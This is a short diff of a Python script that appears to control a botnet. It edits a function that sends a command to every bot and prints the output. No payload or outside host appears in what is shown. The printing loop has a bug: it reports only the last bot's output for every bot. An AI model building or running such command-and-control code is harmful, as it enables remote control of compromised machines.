@@ -31,11 +31,10 @@ class Bot:
 # send a command to all bots in the botnet
 def command_bots(command):
     for bot in botnet:
-#        attack = bot.send_command(command)
-	bot.send_command(command)
-#    for bot in botnet:
-#        print('Output from ' + bot.host)
-#        print(attack)
+        attack = bot.send_command(command)
+    for bot in botnet:
+        print('Output from ' + bot.host)
+        print(attack)
 
 # list of bots in botnet
 botnet = []
